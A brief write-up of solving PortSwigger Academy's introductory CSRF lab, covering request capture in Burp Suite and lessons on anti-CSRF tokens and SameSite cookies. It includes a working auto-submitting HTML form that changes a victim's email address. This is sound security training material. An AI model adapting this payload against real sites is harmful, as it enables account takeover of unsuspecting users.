# PortSwigger Lab: CSRF vulnerability with no defenses

A quick write-up of how I solved the first Cross-Site Request Forgery (CSRF) lab on PortSwigger Academy.

##  How I Solved It

1. **Captured the Target Request:** Logged into the application and intercepted the `POST /my-account/change-email` request using Burp Suite.
2. **Crafted the Exploit (PoC):** Built a malicious HTML page with a hidden form that automatically submits the attack payload when loaded:

```html
<form method="POST" action="https://<YOUR-LAB-ID>.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hacker@exploit.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

3. **Delivered the Payload:** Pasted the HTML into the PortSwigger Exploit Server and clicked **"Deliver to victim"**. 
4. **Result:** The victim's browser executed the form automatically using their active session cookies, successfully changing their email and solving the lab.

##  What I Learned
* **CSRF Mechanics:** How an attacker can force a victim's browser to perform unintended actions (like changing an email) if the application relies only on session cookies.
* **Lack of Defenses:** If an HTTP request lacks unpredictable anti-CSRF tokens or strict `SameSite` cookie attributes, it is completely vulnerable to cross-site attacks.
* **Impact:** In the real world, a CSRF on an email update function can lead to a **Full Account Takeover (ATO)**.


